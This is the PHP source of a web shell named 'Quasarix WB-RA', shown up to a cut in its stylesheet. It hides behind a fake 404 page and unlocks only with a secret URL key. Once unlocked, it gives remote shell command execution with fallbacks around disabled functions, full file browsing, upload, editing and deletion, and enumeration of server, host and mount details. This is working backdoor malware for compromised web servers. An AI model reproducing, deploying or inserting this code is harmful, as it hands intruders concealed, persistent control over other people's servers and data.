<?php
error_reporting(0);
session_start();
define('AUTH_HASH',   '7476ecfefb60c51e4eed372a4219921e600eb73b7241ab9b189c5a3aab1ac7a3');
define('AUTH_COOKIE', 'ws_auth');
define('CHUNK_SIZE',  1024 * 1024);
function base64url_encode($data) {
    $b64 = base64_encode($data);
    $urlSafe = strtr($b64, '+/', '-_');
    return rtrim($urlSafe, '=');
}
function base64url_decode($data) {
    $b64 = strtr($data, '-_', '+/');
    $padding = strlen($b64) % 4;
    if ($padding) {
        $b64 .= str_repeat('=', 4 - $padding);
    }
    return base64_decode($b64);
}
function encodePath($path) {
    return base64url_encode(str_replace(
        array('/', '\\', '.', ':'),
        array('山', '川', '日', '月'),
        $path
    ));
}
function decodePath($path) {
    return str_replace(
        array('山', '川', '日', '月'),
        array('/', '\\', '.', ':'),
        base64url_decode($path)
    );
}
function encodePathUrl($path) {
    return urlencode(encodePath($path));
}
function decodePathParam($raw) {
    return decodePath(urldecode($raw));
}
function flash_set($type, $msg) {
    $_SESSION['flash'] = array('type' => $type, 'msg' => $msg);
}
function flash_get() {
    if (!isset($_SESSION['flash'])) {
        return null;
    }
    $flash = $_SESSION['flash'];
    unset($_SESSION['flash']);
    return $flash;
}
function handle_logout() {
    setcookie(AUTH_COOKIE, '', time() - 3600, '/', '', true, true);
    unset($_COOKIE[AUTH_COOKIE]);
    header('Location: ?');
    exit;
}
function is_authenticated() {
    return isset($_COOKIE[AUTH_COOKIE]) && $_COOKIE[AUTH_COOKIE] === AUTH_HASH;
}
function attempt_key_login() {
    if (!isset($_GET['key'])) {
        return;
    }
    if (hash('sha256', $_GET['key']) === AUTH_HASH) {
        setcookie(AUTH_COOKIE, AUTH_HASH, time() + (7 * 24 * 60 * 60), '/', '', true, true);
        header('Location: ?');
        exit;
    }
}
function render_404() {
    ?>
    <!DOCTYPE html>
	<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
		<title>404 - Page Not Found</title>
		<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
		<style>
		    html, body {
		        height: 100%;
		        margin: 0;
		    }
		    body {
		        background: #f8f9fa;
		        -webkit-text-size-adjust: 100%;
		        overflow-x: hidden;
		    }
		    .page {
		        min-height: 100vh;
		        display: flex;
		        align-items: center;
		        justify-content: center;
		        padding: 24px 16px;
		    }
		    .card-box {
		        width: 100%;
		        max-width: 480px;
		        text-align: center;
		    }
		    .error-code {
		        font-size: clamp(4.5rem, 22vw, 7rem);
		        font-weight: 900;
		        color: #dc3545;
		        line-height: 1;
		    }
		    h1 {
		        font-size: 1.4rem;
		        font-weight: 700;
		    }
		    p {
		        font-size: 1rem;
		        color: #6c757d;
		        margin-bottom: 0;
		    }
		    .btn-home {
		        width: 100%;
		        padding: 14px;
		        border-radius: 12px;
		        font-size: 1rem;
		    }
		    .fade-in {
		        animation: fadeIn 0.45s ease-out both;
		    }
		    @keyframes fadeIn {
		        from {
		            opacity: 0;
		            transform: translateY(10px);
		        }
		        to {
		            opacity: 1;
		            transform: translateY(0);
		        }
		    }
		    @media (max-width: 400px) {
		        .card-box {
		            padding: 0 8px;
		        }
		    }
		</style>
	</head>
	<body>
		<main class="page">
		    <section class="card-box fade-in">
		        <div class="error-code">404</div>
		        <h1 class="mt-3">Page Not Found</h1>
		        <p class="mt-2 px-2">
		            The page you are looking for doesn’t exist or has been moved.
		        </p>
		        <a href="/" class="btn btn-primary btn-home mt-4">
		            Go Home
		        </a>
		        <p class="small mt-4">
		            Check the URL or try again later.
		        </p>
		    </section>
		</main>
	</body>
	</html>
    <?php
    exit;
}
function get_current_path() {
    $raw      = isset($_GET['path']) ? decodePathParam($_GET['path']) : getcwd();
    $resolved = realpath($raw);
    return $resolved ? $resolved : getcwd();
}
function safe_path($base, $name) {
    return $base . DIRECTORY_SEPARATOR . basename($name);
}
function redirect_to_path($path) {
    header('Location: ?path=' . encodePathUrl($path));
    exit;
}
function format_size($bytes) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $bytes >= 1024 && $i < count($units) - 1; $i++) {
        $bytes /= 1024;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}
function format_path($path, $mounts = array()) {
    $parts = preg_split('/[\/\\\\]+/', $path, -1, PREG_SPLIT_NO_EMPTY);
    $links = array();
    $build = '';
    foreach ($parts as $i => $part) {
        $build = ($i === 0 && strpos($part, ':') !== false)
            ? $part . DIRECTORY_SEPARATOR
            : $build . ($i > 0 ? DIRECTORY_SEPARATOR : '') . $part;

        if ($i === 0 && !empty($mounts)) {
            // Root segment — render as a switchable dropdown
            $root_label = htmlspecialchars($part);
            $dd_html  = '<span class="root-switcher" id="root-switcher">';
            $dd_html .= '<span class="root-switcher-label" onclick="toggleRootSwitcher(event)">';
            $dd_html .= $root_label . ' <span class="root-caret">&#9660;</span></span>';
            $dd_html .= '<ul class="root-dropdown" id="root-switcher-dd">';
            foreach ($mounts as $mount) {
                $mount_trim = rtrim($mount, '/\\');
                $build_trim = rtrim($build, '/\\');
                $is_active  = ($mount_trim === $build_trim || strpos($path, $mount_trim) === 0);
                $dd_html .= '<li' . ($is_active ? ' class="active"' : '') . '>';
                $dd_html .= '<a href="?path=' . encodePathUrl($mount) . '">' . htmlspecialchars($mount) . '</a>';
                $dd_html .= '</li>';
            }
            $dd_html .= '</ul></span>';
            $links[] = $dd_html;
        } else {
            $links[] = '<a href="?path=' . encodePathUrl($build) . '">' . htmlspecialchars($part) . '</a>';
        }
    }
    return implode(' <span class="sep">&rsaquo;</span> ', $links);
}
function get_os_type() {
    return stripos(PHP_OS, 'WIN') !== false ? 'Windows' : 'Unix';
}
function get_drives_or_mounts() {
    $is_windows = get_os_type() === 'Windows';
    $strategies = $is_windows ? get_windows_drive_strategies() : get_unix_mount_strategies();
    foreach ($strategies as $strategy) {
        $result = null;
        try {
            $result = call_user_func($strategy);
        } catch (Exception $e) {
            $result = null;
        }
        if (!empty($result) && is_array($result)) {
            return array_values(array_unique($result));
        }
    }
    return array();
}
function get_windows_drive_strategies() {
    return array(
        function () {
            $out = @shell_exec('wmic logicaldisk get name');
            if (!$out) return null;
            preg_match_all('/[A-Z]:\\\\/i', $out, $m);
            return $m[0] ? $m[0] : null;
        },
        function () {
            $out = @shell_exec('powershell -NoProfile -Command "Get-PSDrive -PSProvider FileSystem | Select -Expand Root"');
            if (!$out) return null;
            $lines = array_filter(array_map('trim', explode("\n", $out)));
            return $lines ? array_values($lines) : null;
        },
        function () {
            $found = array();
            foreach (range('A', 'Z') as $letter) {
                $drive = $letter . ':\\';
                if (@is_dir($drive)) { $found[] = $drive; }
            }
            return $found ? $found : null;
        },
    );
}
function get_unix_mount_strategies() {
    return array(
        function () {
            if (!@is_readable('/proc/mounts')) return null;
            $lines = @file('/proc/mounts');
            if (!$lines) return null;
            $mounts = array();
            foreach ($lines as $line) {
                $parts = explode(' ', $line);
                if (isset($parts[1]) && $parts[1] !== '') { $mounts[] = $parts[1]; }
            }
            return $mounts ? $mounts : null;
        },
        function () {
            $out = @shell_exec('mount');
            if (!$out) return null;
            preg_match_all('/on (.*?) /', $out, $m);
            return $m[1] ? $m[1] : null;
        },
        function () {
            $out = @shell_exec('df -P');
            if (!$out) return null;
            $lines  = array_slice(explode("\n", trim($out)), 1);
            $mounts = array();
            foreach ($lines as $line) {
                $parts = preg_split('/\s+/', $line);
                if (!empty($parts[5])) { $mounts[] = $parts[5]; }
            }
            return $mounts ? $mounts : null;
        },
        function () {
            $bases  = array('/mnt', '/media', '/Volumes');
            $result = array();
            foreach ($bases as $base) {
                if (!@is_dir($base)) continue;
                $items = @scandir($base);
                if (!$items) continue;
                foreach ($items as $item) {
                    if ($item !== '.' && $item !== '..') { $result[] = $base . '/' . $item; }
                }
            }
            return $result ? $result : null;
        },
    );
}
function get_system_info() {
    $disk_total = @disk_total_space('.');
    $disk_free  = @disk_free_space('.');
    return array(
        'OS'                 => @php_uname() ? @php_uname() : 'N/A',
        'PHP Version'        => phpversion() ? phpversion() : 'N/A',
        'Server Software'    => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A',
        'Server IP'          => isset($_SERVER['SERVER_ADDR'])     ? $_SERVER['SERVER_ADDR']     : 'N/A',
        'Client IP'          => isset($_SERVER['REMOTE_ADDR'])     ? $_SERVER['REMOTE_ADDR']     : 'N/A',
        'Document Root'      => isset($_SERVER['DOCUMENT_ROOT'])   ? $_SERVER['DOCUMENT_ROOT']   : 'N/A',
        'Disk Total'         => $disk_total ? round($disk_total / 1073741824, 2) . ' GB' : 'N/A',
        'Disk Free'          => $disk_free  ? round($disk_free  / 1073741824, 2) . ' GB' : 'N/A',
        'Loaded Extensions'  => implode(', ', get_loaded_extensions()),
        'Disabled Functions' => ini_get('disable_functions') ? ini_get('disable_functions') : 'None',
        'User'               => @get_current_user() ? @get_current_user() : 'N/A',
    );
}
function get_host_info() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    return array(
        'Protocol'        => strtoupper($protocol),
        'Host'            => isset($_SERVER['HTTP_HOST'])          ? $_SERVER['HTTP_HOST']          : 'N/A',
        'Base Path'       => isset($_SERVER['SCRIPT_NAME'])        ? dirname($_SERVER['SCRIPT_NAME']) : 'N/A',
        'Request URI'     => isset($_SERVER['REQUEST_URI'])        ? $_SERVER['REQUEST_URI']        : 'N/A',
        'Query String'    => isset($_SERVER['QUERY_STRING'])       ? $_SERVER['QUERY_STRING']       : 'N/A',
        'Request Method'  => isset($_SERVER['REQUEST_METHOD'])     ? $_SERVER['REQUEST_METHOD']     : 'N/A',
        'User Agent'      => isset($_SERVER['HTTP_USER_AGENT'])    ? $_SERVER['HTTP_USER_AGENT']    : 'N/A',
        'Referrer'        => isset($_SERVER['HTTP_REFERER'])       ? $_SERVER['HTTP_REFERER']       : 'N/A',
        'Accept Language' => isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'N/A',
        'Remote Port'     => isset($_SERVER['REMOTE_PORT'])        ? $_SERVER['REMOTE_PORT']        : 'N/A',
        'Server Port'     => isset($_SERVER['SERVER_PORT'])        ? $_SERVER['SERVER_PORT']        : 'N/A',
        'Server Name'     => isset($_SERVER['SERVER_NAME'])        ? $_SERVER['SERVER_NAME']        : 'N/A',
        'Script Filename' => isset($_SERVER['SCRIPT_FILENAME'])    ? $_SERVER['SCRIPT_FILENAME']    : 'N/A',
        'Current Script'  => isset($_SERVER['SCRIPT_NAME'])        ? $_SERVER['SCRIPT_NAME']        : 'N/A',
    );
}
function is_available($name, $disabled)
{
    return function_exists($name) && !in_array($name, $disabled, true);
}
function run_command($cmd)
{
    $raw      = ini_get('disable_functions');
    $disabled = $raw ? array_map('trim', explode(',', $raw)) : array();
    if (is_available('shell_exec', $disabled)) { return (string) shell_exec($cmd); }
    if (is_available('exec', $disabled)) {
        $lines = array();
        exec($cmd, $lines);
        return implode("\n", $lines);
    }
    if (is_available('system', $disabled)) {
        ob_start(); system($cmd); return (string) ob_get_clean();
    }
    if (is_available('passthru', $disabled)) {
        ob_start(); passthru($cmd); return (string) ob_get_clean();
    }
    if (is_available('proc_open', $disabled)) {
        $spec    = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
        $process = proc_open($cmd, $spec, $pipes);
        if (!is_resource($process)) { return 'proc_open failed to start.'; }
        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]) . "\n" . stream_get_contents($pipes[2]);
        fclose($pipes[1]); fclose($pipes[2]); proc_close($process);
        return trim($output);
    }
    return 'No execution method available on this server.';
}
function handle_download($path)
{
    $file = safe_path($path, isset($_GET['file']) ? $_GET['file'] : '');
    if (!is_file($file) || !is_readable($file)) {
        flash_set('error', 'Download failed: file not found or not readable.');
        redirect_to_path($path);
    }
    set_time_limit(0);
    ignore_user_abort(true);
    $size     = filesize($file);
    $filename = basename($file);
    $start    = 0;
    $end      = $size - 1;
    if (isset($_SERVER['HTTP_RANGE'])) {
        if (preg_match('/bytes=(\d*)-(\d*)/', $_SERVER['HTTP_RANGE'], $m)) {
            if ($m[1] !== '') $start = (int) $m[1];
            if ($m[2] !== '') $end   = (int) $m[2];
        }
        if ($start > $end || $start > $size - 1) {
            header('HTTP/1.1 416 Requested Range Not Satisfiable'); exit;
        }
        header('HTTP/1.1 206 Partial Content');
    }
    $length = $end - $start + 1;
    while (ob_get_level()) ob_end_clean();
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    header('Content-Transfer-Encoding: binary');
    header('Accept-Ranges: bytes');
    header('Content-Length: ' . $length);
    if (isset($_SERVER['HTTP_RANGE'])) { header("Content-Range: bytes $start-$end/$size"); }
    $fp = fopen($file, 'rb');
    if (!$fp) exit;
    fseek($fp, $start);
    $sent = 0;
    while (!feof($fp) && $sent < $length) {
        $read   = min(CHUNK_SIZE, $length - $sent);
        $buffer = fread($fp, $read);
        echo $buffer; flush();
        $sent += $read;
        usleep(50000);
    }
    fclose($fp);
    exit;
}
function handle_upload($path)
{
    $name = isset($_FILES['file']['name'])     ? $_FILES['file']['name']     : '';
    $tmp  = isset($_FILES['file']['tmp_name']) ? $_FILES['file']['tmp_name'] : '';
    if ($tmp && $name) {
        $dest = safe_path($path, $name);
        if (move_uploaded_file($tmp, $dest)) {
            flash_set('success', 'Uploaded "' . $name . '" successfully.');
        } else {
            flash_set('error', 'Upload failed: could not move file to destination.');
        }
    } else {
        flash_set('error', 'Upload failed: no file received.');
    }
    redirect_to_path($path);
}
function handle_create_folder($path)
{
    $name = trim(isset($_POST['name']) ? $_POST['name'] : '');
    if ($name === '') {
        flash_set('error', 'Folder creation failed: name cannot be empty.');
        redirect_to_path($path);
    }
    $target = safe_path($path, $name);
    if (is_dir($target)) {
        flash_set('error', 'Folder creation failed: "' . $name . '" already exists.');
    } elseif (@mkdir($target)) {
        flash_set('success', 'Folder "' . $name . '" created successfully.');
    } else {
        flash_set('error', 'Folder creation failed: insufficient permissions.');
    }
    redirect_to_path($path);
}
function handle_delete($path)
{
    $name   = isset($_GET['target']) ? $_GET['target'] : '';
    $target = safe_path($path, $name);
    if (!file_exists($target)) {
        flash_set('error', 'Delete failed: target does not exist.');
        redirect_to_path($path);
    }
    $deleted = is_dir($target) ? @rmdir($target) : @unlink($target);
    if ($deleted) {
        flash_set('success', '"' . $name . '" deleted successfully.');
    } else {
        flash_set('error', 'Delete failed: could not remove "' . $name . '" (check permissions or directory not empty).');
    }
    redirect_to_path($path);
}
function handle_rename($path)
{
    $old = trim(isset($_POST['old']) ? $_POST['old'] : '');
    $new = trim(isset($_POST['new']) ? $_POST['new'] : '');
    $src = safe_path($path, $old);
    $dst = safe_path($path, $new);
    if ($old === '' || $new === '') {
        flash_set('error', 'Rename failed: both old and new names are required.');
        redirect_to_path($path);
    }
    if (!file_exists($src)) {
        flash_set('error', 'Rename failed: "' . $old . '" does not exist.');
    } elseif (file_exists($dst)) {
        flash_set('error', 'Rename failed: "' . $new . '" already exists.');
    } elseif (@rename($src, $dst)) {
        flash_set('success', 'Renamed "' . $old . '" to "' . $new . '" successfully.');
    } else {
        flash_set('error', 'Rename failed: insufficient permissions.');
    }
    redirect_to_path($path);
}
function handle_view($path)
{
    $file = safe_path($path, isset($_GET['file']) ? $_GET['file'] : '');
    if (!is_file($file) || !is_readable($file)) {
        flash_set('error', 'View failed: file not found or not readable.');
        redirect_to_path($path);
    }
    $filename  = basename($file);
    $file_size = filesize($file);
    $sample   = (string) @file_get_contents($file, false, null, 0, 8192);
    $is_text  = strpos($sample, "\x00") === false;
    $max_text = 512 * 1024;
    $truncated = false;
    $line_count = 0;
    $raw_content = '';
    if ($is_text) {
        if ($file_size > $max_text) {
            $raw_content = (string) @file_get_contents($file, false, null, 0, $max_text);
            $truncated   = true;
        } else {
            $raw_content = (string) @file_get_contents($file);
        }
        $line_count = substr_count($raw_content, "\n") + 1;
    }
    $ext           = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $image_exts    = array('png', 'jpg', 'jpeg', 'gif', 'webp', 'bmp', 'svg', 'ico');
    $is_image      = in_array($ext, $image_exts, true);
    $filename_html = htmlspecialchars($filename);
    $path_enc      = encodePathUrl($path);
    $file_enc      = urlencode($filename);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>View &mdash; <?php echo $filename_html; ?></title>
        <style>
            *, *::before, *::after { box-sizing: border-box; }
            body {
                background:  #0b1220;
                color:       #d7e1ff;
                font-family: 'Courier Prime', monospace;
                margin:      0;
                padding:     0;
            }
            .vbar {
                position:      sticky;
                top:           0;
                background:    #0f1a2e;
                border-bottom: 1px solid #1f2b45;
                display:       flex;
                align-items:   center;
                gap:           12px;
                padding:       10px 20px;
                z-index:       10;
                flex-wrap:     wrap;
            }
            .vbar a, .vbar span {
                font-size:     13px;
                color:         #4da3ff;
                text-decoration: none;
            }
            .vbar .vtitle {
                color:       #d7e1ff;
                font-weight: bold;
                font-size:   14px;
                margin-left: 6px;
            }
            .vbar .vmeta {
                margin-left: auto;
                font-size:   11px;
                color:       #8ea0c6;
                white-space: nowrap;
            }
            .vbar .vbtn {
                padding:       5px 12px;
                background:    #0c1526;
                border:        1px solid #1f2b45;
                border-radius: 6px;
                color:         #d7e1ff;
                font-size:     12px;
                cursor:        pointer;
                text-decoration: none;
                white-space:   nowrap;
            }
            .vbar .vbtn:hover { background: #16223a; }
            .trunc-warn {
                background:   #2e1d0d;
                border-bottom: 1px solid #5c3a1a;
                color:        #cf9a67;
                font-size:    12px;
                padding:      8px 20px;
                text-align:   center;
            }
            .viewer-wrap {
                display:    flex;
                overflow-x: auto;
            }
            .line-numbers {
                user-select:    none;
                -webkit-user-select: none;
                padding:        16px 12px 16px 20px;
                text-align:     right;
                color:          #3a4f70;
                font-size:      12px;
                line-height:    1.6;
                border-right:   1px solid #1f2b45;
                background:     #0c1526;
                min-width:      52px;
                white-space:    pre;
            }
            .line-code {
                padding:     16px 20px;
                font-size:   12px;
                line-height: 1.6;
                color:       #d7e1ff;
                white-space: pre;
                flex:        1;
                overflow-x:  auto;
            }
            .binary-notice {
                margin:        40px auto;
                max-width:     540px;
                text-align:    center;
                background:    #0f1a2e;
                border:        1px solid #1f2b45;
                border-radius: 10px;
                padding:       32px 24px;
                color:         #8ea0c6;
                font-size:     13px;
            }
            .binary-notice .bi-icon { font-size: 40px; margin-bottom: 12px; }
            .binary-notice p { margin: 6px 0; }
            .img-wrap {
                padding:    24px;
                text-align: center;
            }
            .img-wrap img {
                max-width:     100%;
                border:        1px solid #1f2b45;
                border-radius: 8px;
            }
        </style>
    </head>
    <body>
    <div class="vbar">
        <a href="?path=<?php echo $path_enc; ?>">Back</a>
        <span class="vtitle"><?php echo $filename_html; ?></span>
        <?php if (!$is_image): ?>
            <a class="vbtn" href="?path=<?php echo $path_enc; ?>&amp;action=edit&amp;file=<?php echo $file_enc; ?>">Edit</a>
        <?php endif; ?>
        <a class="vbtn" href="?path=<?php echo $path_enc; ?>&amp;action=download&amp;file=<?php echo $file_enc; ?>">Download</a>
        <span class="vmeta">
            <?php echo format_size($file_size); ?>
            <?php if ($is_text && !$is_image): ?>&nbsp;&middot;&nbsp;<?php echo number_format($line_count); ?> lines<?php endif; ?>
        </span>
    </div>
    <?php if ($truncated): ?>
        <div class="trunc-warn">&#9888; File exceeds 512 KB — showing first 512 KB only. Download for full content.</div>
    <?php endif; ?>
    <?php if ($is_image): ?>
        <div class="img-wrap">
            <img src="?path=<?php echo $path_enc; ?>&amp;action=download&amp;file=<?php echo $file_enc; ?>"
                 alt="<?php echo $filename_html; ?>">
        </div>
    <?php elseif ($is_text): ?>
        <div class="viewer-wrap">
            <div class="line-numbers" id="ln-col" aria-hidden="true"></div>
            <pre class="line-code" id="code-col"><?php echo htmlspecialchars($raw_content); ?></pre>
        </div>
        <script>
            (function () {
                var pre   = document.getElementById('code-col');
                var lnCol = document.getElementById('ln-col');
                if (!pre || !lnCol) return;
                var text  = pre.textContent || pre.innerText || '';
                var count = text.split('\n').length;
                var nums  = [];
                for (var i = 1; i <= count; i++) { nums.push(i); }
                lnCol.textContent = nums.join('\n');
            }());
        </script>
    <?php else: ?>
        <div class="binary-notice">
            <div class="bi-icon">&#128196;</div>
            <p><strong><?php echo $filename_html; ?></strong></p>
            <p>This file appears to be binary and cannot be displayed as text.</p>
            <p>Size: <?php echo format_size($file_size); ?></p>
            <p style="margin-top:18px;">
                <a class="vbtn" href="?path=<?php echo $path_enc; ?>&amp;action=download&amp;file=<?php echo $file_enc; ?>">Download File</a>
            </p>
        </div>
    <?php endif; ?>
    </body>
    </html>
    <?php
    exit;
}
function handle_edit($path)
{
    $file = safe_path($path, isset($_GET['file']) ? $_GET['file'] : '');
    if (!is_file($file)) {
        flash_set('error', 'Edit failed: file not found.');
        redirect_to_path($path);
    }
    $save_status = '';
    if (isset($_POST['content'])) {
        $save_status = (file_put_contents($file, $_POST['content']) !== false) ? 'success' : 'error';
    }
    $content  = file_get_contents($file);
    $filename = htmlspecialchars(basename($file));
    $path_enc = encodePathUrl($path);
    $file_enc = urlencode(basename($file));
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Edit &mdash; <?php echo $filename; ?></title>
        <style>
            *, *::before, *::after { box-sizing: border-box; }
            body { background: #0b1220; color: #d7e1ff; font-family: 'Courier Prime', monospace; padding: 24px; margin: 0; }
            h3 { margin: 12px 0; font-size: 16px; }
            a { color: #4da3ff; }
            .edit-actions { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; flex-wrap: wrap; }
            .edit-actions a { font-size: 13px; padding: 6px 12px; border: 1px solid #1f2b45; border-radius: 6px; color: #d7e1ff; text-decoration: none; }
            .edit-actions a:hover { background: #16223a; }
            textarea {
                display: block; width: 100%; height: 65vh;
                background: #0f1a2e; color: #d7e1ff; border: 1px solid #1f2b45;
                padding: 12px; font-family: monospace; font-size: 13px;
                border-radius: 8px; resize: vertical;
            }
            .btn { margin-top: 12px; padding: 8px 16px; background: #0f1a2e; color: #d7e1ff; border: 1px solid #1f2b45; cursor: pointer; border-radius: 6px; font-size: 13px; }
            .btn:hover { background: #16223a; }
            .toast { display: inline-flex; align-items: center; gap: 8px; padding: 10px 16px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; border: 1px solid transparent; }
            .toast.success { background: #0d2e1a; border-color: #1a5c30; color: #4caf80; }
            .toast.error   { background: #2e0d0d; border-color: #5c1a1a; color: #cf6679; }
        </style>
    </head>
    <body>
        <div class="edit-actions">
            <a href="?path=<?php echo $path_enc; ?>">Back</a>
            <a href="?path=<?php echo $path_enc; ?>&amp;action=view&amp;file=<?php echo $file_enc; ?>">View</a>
        </div>
        <h3>Editing: <?php echo $filename; ?></h3>
        <?php if ($save_status === 'success'): ?>
            <div class="toast success">&#10003; File saved successfully.</div>
        <?php elseif ($save_status === 'error'): ?>
            <div class="toast error">&#10007; Save failed &mdash; check file permissions.</div>
        <?php endif; ?>
        <form method="post">
            <textarea name="content"><?php echo htmlspecialchars((string) $content); ?></textarea>
            <br>
            <button type="submit" class="btn">Save</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}
function handle_command()
{
    $cmd = trim(isset($_POST['cmd']) ? $_POST['cmd'] : '');
    if ($cmd === '') { return ''; }
    $output = run_command($cmd);
    if (trim($output) === '') {
        flash_set('success', 'Command executed -- no output returned.');
        return '';
    }
    return $output;
}
if (isset($_GET['logout']) && $_GET['logout'] === 'true') {
    handle_logout();
}
if (!is_authenticated()) {
    attempt_key_login();
    render_404();
}
$path   = get_current_path();
$action = isset($_GET['action']) ? $_GET['action'] : '';
if (isset($_FILES['file'])) { handle_upload($path); }
if      ($action === 'create_folder') { handle_create_folder($path); }
elseif  ($action === 'delete')        { handle_delete($path); }
elseif  ($action === 'rename')        { handle_rename($path); }
elseif  ($action === 'download')      { handle_download($path); }
elseif  ($action === 'edit')          { handle_edit($path); }
elseif  ($action === 'view')          { handle_view($path); }
$command_output = handle_command();
$flash        = flash_get();
$system_info  = get_system_info();
$host_info    = get_host_info();
$dir_contents = scandir($path);
$mounts     = get_drives_or_mounts();
$label_pfx  = get_os_type() === 'Windows' ? 'Drive' : 'Mount';
$drive_info = array();
foreach ($mounts as $i => $mount) {
    $drive_info[$label_pfx . ' ' . ($i + 1)] = $mount;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="4steroth">
    <title>Quasarix WB-RA</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg:     #0b1220;
            --panel:  #0f1a2e;
            --panel2: #0c1526;
            --border: #1f2b45;
            --text:   #d7e1ff;
            --muted:  #8ea0c6;
            --accent: #4da3ff;
            --hover:  #16223a;
            --toast-success-bg:     #0d2e1a;
            --toast-success-border: #1a5c30;
            --toast-success-text:   #4caf80;
            --toast-error-bg:       #2e0d0d;
            --toast-error-border:   #5c1a1a;
            --toast-error-text:     #cf6679;
        }
        *, *::before, *::after { box-sizing: border-box; font-family: "Courier Prime", sans-serif; text-decoration: none; }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: "Courier Prime", sans-serif; }
        .footer {
			position: fixed;
			bottom: 0;
			left: 320px;
			right: 0;
			height: 40px;
			background: var(--panel);
			border-top: 1px solid var(--border);
			display: flex;
			align-items: center;
			justify-content: space-between;
			padding: 0 14px;
			font-size: 11px;
			color: var(--muted);
			z-index: 100;
		}
        a { color: var(--accent); }
        input, button { background: var(--panel2); border: 1px solid var(--border); color: var(--text); padding: 6px 8px; border-radius: 6px; }
        button { cursor: pointer; }
        .sidebar { position: fixed; top: 0; left: 0; width: 320px; height: 100%; background: var(--panel); border-right: 1px solid var(--border); padding: 16px; overflow: auto; }
        .card { background: var(--panel2); border: 1px solid var(--border); border-radius: 10px; padding: 12px; margin-bottom: 14px; overflow-wrap: anywhere; word-break: break-word; }
        .card h3 { margin: 0 0 10px; font-size: 13px; color: var(--accent); }
        .info-row    { margin-bottom: 6px; }
        .info-label  { font-size: 11px; color: var(--text); }
        .info-value  { font-size: 11px; color: var(--muted); }
        .navbar { position: fixed; top: 0; left: 320px; right: 0; height: 80px; background: var(--panel); border-bottom: 1px solid var(--border); display: flex; align-items: center; padding: 0 14px; gap: 10px; z-index: 100; flex-wrap: wrap; overflow: hidden; }
        .navbar a { text-decoration: none; padding: 6px 10px; border: 1px solid var(--border); border-radius: 6px; color: var(--text); }
        .navbar a:hover { background: var(--hover); }
        .nav-group { display: flex; align-items: center; padding: 4px; border: 1px solid var(--border); border-radius: 8px; background: var(--panel2); }
        .mini-form { display: flex; align-items: center; gap: 5px; }
        .mini-form input[type="text"], .mini-form input[type="file"] { background: var(--panel); border: 1px solid var(--border); color: var(--text); padding: 5px 6px; border-radius: 6px; font-size: 12px; width: 90px; }
        .mini-form button { padding: 5px 9px; font-size: 12px; white-space: nowrap; }
        .breadcrumb { position: fixed; top: 80px; left: 320px; right: 0; padding: 8px 14px; background: var(--panel2); border-bottom: 1px solid var(--border); font-size: 12px; color: var(--muted); white-space: nowrap; overflow: auto; z-index: 99; }
        .main { margin-left: 320px; margin-top: 112px; padding: 18px; margin-bottom: 60px; }
        .toast { display: flex; align-items: center; gap: 10px; padding: 12px 16px; border-radius: 10px; font-size: 13px; margin-bottom: 16px; border: 1px solid transparent; animation: slideDown 0.25s ease; }
        .toast.success { background: var(--toast-success-bg); border-color: var(--toast-success-border); color: var(--toast-success-text); }
        .toast.error   { background: var(--toast-error-bg);   border-color: var(--toast-error-border);   color: var(--toast-error-text); }
        .toast-icon  { font-size: 15px; flex-shrink: 0; }
        .toast-close { margin-left: auto; cursor: pointer; opacity: 0.6; background: none; border: none; color: inherit; font-size: 15px; padding: 0; }
        .toast-close:hover { opacity: 1; }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
        table { width: 100%; border-collapse: collapse; background: var(--panel); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; table-layout: fixed; }
        th, td { padding: 10px; border-bottom: 1px solid var(--border); font-size: 13px; vertical-align: middle; word-wrap: break-word; }
        th { color: var(--accent); background: var(--panel2); text-align: left; font-family: "Orbitron", sans-serif; }
        td:nth-child(1) { width: 38%; }
        td:nth-child(2) { width: 8%;  }
        td:nth-child(3) { width: 12%; }
        td:nth-child(4) { width: 42%; }
        tr:hover { background: var(--hover); }
        .actions { display: flex; align-items: center; gap: 4px; flex-wrap: wrap; }
        .act-btn {
            display:       inline-flex;
            align-items:   center;
            justify-content: center;
            padding:       4px 7px;
            font-size:     13px;
            border:        1px solid var(--border);
            border-radius: 5px;
            color:         var(--muted);
            background:    transparent;
            cursor:        pointer;
            text-decoration: none;
            line-height:   1;
            white-space:   nowrap;
        }
        .act-btn:hover { background: var(--hover); color: var(--text); border-color: var(--accent); }
        .act-btn.danger:hover { background: #2e0d0d; color: #cf6679; border-color: #5c1a1a; }
        .rename-row { display: none; }
        .rename-row td { padding: 6px 10px; background: #0c1a30; }
        .rename-row.open { display: table-row; }
        .rename-form { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
